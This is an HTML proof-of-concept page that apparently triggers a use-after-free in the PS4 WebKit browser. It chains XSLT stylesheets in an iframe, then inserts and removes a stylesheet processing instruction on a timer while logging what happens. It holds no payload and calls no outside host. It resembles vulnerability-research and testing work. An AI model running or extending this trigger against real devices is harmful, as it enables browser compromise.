
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">

<title>PS4 WebKit XSLT UAF - Static V2</title>

<style>
body {
    font-family: Arial, sans-serif;
    margin: 20px;
    background: #111;
    color: #ddd;
}

h2 {
    font-size: 22px;
}

#log {
    white-space: pre-wrap;
    font-family: monospace;
    background: #000;
    border: 1px solid #777;
    padding: 12px;
    min-height: 300px;
}

iframe {
    display: block;
    width: 100%;
    height: 150px;
    margin-top: 15px;
    border: 1px solid #777;
}

.ok {
    margin-top: 15px;
    padding: 10px;
    border: 1px solid #777;
}
</style>
</head>

<body>

<h2>PS4 WebKit XSLT Static V2</h2>

<div id="log"></div>

<div class="ok">
    Initial XSLT chain:
    target.xml → root.xsl → child.xsl → grandchild.xsl
</div>

<iframe
    id="f"
    src="resources/target.xml">
</iframe>

<script>

(function () {

    var logBox = document.getElementById("log");
    var frame = document.getElementById("f");

    var start = Date.now();

    function elapsed() {
        return (Date.now() - start) + "ms";
    }

    function log(message) {
        logBox.textContent +=
            "[" + elapsed() + "] " + message + "\n";
    }

    /*
     * We deliberately do NOT wait for iframe.onload.
     *
     * The original WebKit test also performs the operation
     * after a fixed 500 ms delay rather than waiting for the
     * stylesheet chain to finish.
     */

    log("Test started.");

    log("Loading target.xml");

    log("Expected stylesheet chain:");
    log("  target.xml");
    log("      -> root.xsl");
    log("          -> child.xsl");
    log("              -> grandchild.xsl");

    /*
     * Useful diagnostic only.
     *
     * If iframe.onload happens before 500 ms, the chain has
     * probably already completed before our trigger.
     */

    frame.onload = function () {
        log("iframe load event fired.");
        log("The XML document/navigation completed.");
    };

    /*
     * 500 ms trigger.
     *
     * This is intentionally kept close to the original
     * LayoutTest.
     */

    setTimeout(function () {

        log("500 ms trigger reached.");

        try {

            var doc = frame.contentDocument;

            if (!doc) {
                log("ERROR: contentDocument is null.");
                return;
            }

            log("contentDocument obtained.");

            /*
             * Create exactly the type of ProcessingInstruction
             * used by the original test.
             */

            var pi = doc.createProcessingInstruction(
                "xml-stylesheet",
                'type="text/xsl" href="#x"'
            );

            log("xml-stylesheet ProcessingInstruction created.");

            /*
             * Insert before the first child.
             */

            doc.insertBefore(pi, doc.firstChild);

            log("ProcessingInstruction inserted.");

            /*
             * Immediately remove it.
             */

            pi.parentNode.removeChild(pi);

            log("ProcessingInstruction removed.");

            log("500 ms trigger completed.");

        } catch (e) {

            log("Exception during trigger:");
            log(String(e));

        }

    }, 500);

    /*
     * Diagnostic checkpoints.
     *
     * These DO NOT manipulate the stylesheet chain.
     */

    setTimeout(function () {

        log("1000 ms checkpoint.");

        try {

            var doc = frame.contentDocument;

            if (doc) {
                log("XML document is still accessible.");
            } else {
                log("XML document is unavailable.");
            }

        } catch (e) {

            log("1000 ms exception:");
            log(String(e));

        }

    }, 1000);

    setTimeout(function () {

        log("2000 ms checkpoint.");

        try {

            var doc = frame.contentDocument;

            if (doc)
                log("contentDocument still accessible.");
            else
                log("contentDocument unavailable.");

        } catch (e) {

            log("2000 ms exception:");
            log(String(e));

        }

    }, 2000);

    /*
     * Same approximate total observation window as the
     * original test.
     */

    setTimeout(function () {

        log("3500 ms test completed.");
        log("Browser is still executing JavaScript.");

    }, 3500);

})();

</script>

</body>
</html>
